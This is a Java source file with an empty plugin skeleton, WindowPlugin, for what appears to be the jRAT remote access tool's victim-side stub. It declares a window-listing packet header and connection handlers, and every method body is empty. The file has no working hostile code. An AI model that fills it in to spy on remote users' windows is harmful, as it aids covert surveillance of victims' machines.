package se.jrat.plugin.window.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.stub.StubPlugin;

public class WindowPlugin extends StubPlugin {
	
	public static final byte HEADER_LIST = -127;

	@Override
	public void onStart() throws Exception {
		
	}

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		
	}

	@Override
	public void onPacket(byte header) throws Exception {
		if (header == HEADER_LIST) {
			
		}
	}

	@Override
	public void onEnable() throws Exception {
		
	}

}
